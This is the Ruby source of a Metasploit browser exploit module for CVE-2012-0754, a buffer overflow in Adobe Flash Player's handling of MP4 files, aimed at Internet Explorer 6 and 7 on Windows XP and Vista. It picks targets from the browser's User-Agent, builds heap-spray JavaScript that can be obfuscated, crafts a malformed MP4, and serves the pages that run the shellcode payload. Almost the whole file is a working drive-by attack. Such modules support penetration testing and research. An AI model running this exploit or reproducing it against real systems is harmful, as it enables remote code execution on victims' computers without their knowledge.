# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::HttpServer::HTML
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Adobe Flash Player MP4 cprt box Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Adobe Flash Player&#039;s Flash10u.ocx
                component.  When processing a MP4 file
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;hongin[at]zeroxss.com&#039;
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0754&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zeroxss.com/&#039; ],
                    [ &#039;URL&#039;, &#039;http://contagiodump.blogspot.com/2012/03/mar-2-cve-2012-0754-irans-oil-and.html&#039; ],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;        => "\x00",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039;         => "seh",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {} ],
                    [ &#039;IE 6 on Windows XP SP3&#039;,         { &#039;Offset&#039; => &#039;0x600&#039; } ], #0x5f4 = spot on
                    [ &#039;IE 7 on Windows XP SP3 / Vista&#039;, { &#039;Offset&#039; => &#039;0x600&#039; } ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "2012.03.06",
            &#039;DefaultTarget&#039;  => 0))
            register_options(
                [
                    OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;]),
                    OptString.new(&#039;SWF_PLAYER_URI&#039;, [true, &#039;Path to the SWF Player&#039;])
                ], self.class)
    end
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
        if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
            return targets[1]
        elsif agent =~ /MSIE 7/
            return targets[2]
        else
            return nil
        end
    end
    def on_request_uri(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
        my_target = get_target(agent)
        # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
        if my_target.nil?
            print_error("Browser not supported, will not launch attack: #{agent.to_s}: #{cli.peerhost}:#{cli.peerport}")
            send_not_found(cli)
            return
        end
        # The SWF requests our MP4 trigger
        if request.uri =~ /\.mp4$/
            print_status("Sending MP4 to #{cli.peerhost}:#{cli.peerport}...")
            #print_error("Sorry, not sending you the mp4 for now")
            #send_not_found(cli)
            send_response(cli, @mp4, {&#039;Content-Type&#039;=>&#039;video/mp4&#039;})
            return
        end
        # Set payload depending on target
        p = payload.encoded
        js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
        js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
        js = <<-JS
        var heap_obj = new heapLib.ie(0x20000);
        var code = unescape("#{js_code}");
        var nops = unescape("#{js_nops}");
        while (nops.length < 0x80000) nops += nops;
        var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
        var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
        while (shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x80000-6)/2);
        heap_obj.gc();
        for (var i=1; i < 0x300; i++) {
            heap_obj.alloc(block);
        }
        JS
        js = heaplib(js, {:noobfu => true})
        if datastore[&#039;OBFUSCATE&#039;]
            js = ::Rex::Exploitation::JSObfu.new(js)
            js.obfuscate
        end
        myhost = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(&#039;50.50.50.50&#039;) : datastore[&#039;SRVHOST&#039;]
        mp4_uri = "http://#{myhost}:#{datastore[&#039;SRVPORT&#039;]}#{get_resource()}/#{rand_text_alpha(rand(6)+3)}.mp4"
        swf_uri = "#{datastore[&#039;SWF_PLAYER_URI&#039;]}?autostart=true&image=video.jpg&file=#{mp4_uri}"
        html = %Q|
        <html>
        <head>
        <script>
        #{js}
        </script>
        </head>
        <body>
        <object width="1" height="1" type="application/x-shockwave-flash" data="#{swf_uri}">
        <param name="movie" value="#{swf_uri}">
        </object>
        </body>
        </html>
        |
        html = html.gsub(/^\t\t/, &#039;&#039;)
        print_status("Sending html to #{cli.peerhost}:#{cli.peerport}...")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
    def exploit
        @mp4 = create_mp4
        super
    end
    def create_mp4
        ftypAtom = "\x00\x00\x00\x18"                   #Size
        ftypAtom << "ftypmp42"
        ftypAtom << "\x00\x00\x00\x00"
        ftypAtom << "mp42isom"
        mdatAtom = "\x00\x00\x00\x0D"                   #Size
        mdatAtom << "cprt"
        mdatAtom << "\x00\xFF\xFF\xFF\x00\x00\x00\x00"
        m = ftypAtom + mdatAtom + "\x0C" * 22328
        return m
    end
end
#Example of SWF player URI:
#http://www.jeroenwijering.com/embed/mediaplayer.swf



